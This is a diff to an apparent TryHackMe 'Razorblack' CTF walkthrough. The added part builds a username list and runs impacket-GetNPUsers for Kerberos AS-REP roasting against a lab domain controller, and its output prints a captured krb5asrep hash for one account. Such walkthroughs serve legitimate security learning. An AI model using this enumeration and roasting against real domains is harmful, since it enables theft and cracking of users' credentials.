@@ -121,16 +121,40 @@ tyson williams
 steven bradley
 chamber lin
 ```
-daven port
-imogen royce
-tamara vidal
-arthur edwards
-carl ingram
-nolan cassidy
-reza zaydan
-ljudmila vetrova
-rico delgado
-tyson williams
-steven bradley
-chamber lin
-![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d82073ad-4c86-4100-9b60-9dddeb83417e)
+we got the users available. in the mounted file, we can see a username `sbradley`, let's use this format to generate lists of usernames. 
+
+```
+dport
+iroyce
+tvidal
+aedwards
+cingram
+ncassidy
+rzaydan
+lvetrova
+rdelgado
+twilliams
+sbradley
+clin
+```
+made a list of usernames. let's try keberos tgt request on these usernames. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
+└─$ impacket-GetNPUsers -dc-ip 10.10.35.124  -outputfile hashes.asreproast1 -usersfile user -request raz0rblack.thm/
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:b402a32bf45cbfb1e3f4aa8883a38c1e$20991bb387705e09fd43b4299000f464c863ad86f92e317596754993797d3a95aee1e1d5da35979673cc7b9a6cc3e620c51562a0db0ce475108a1130a3eee1ebcbddae63a033ff84e1f91681d998de75c1372b5b2c391dc7a09a50ae9ea98c24a3d96f4ba087e19ca42ad1ea7650b598c1b45e4ebd1fcf206fb98e83586af03e82c0411c293d8ffed8cce863e19027735dfc44bbdfbe5a9066f771c81ae1697a68804670a815d6510f4402d16cc155a0483b2d129397a3879f5d7a721fba65779f5a3cb78198dee282fd72bb4a7c6fc40f9e177d40c79d2ff3022f1753168a045f8a49206ef89fa7807be28ef85041b5
+[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+```
+
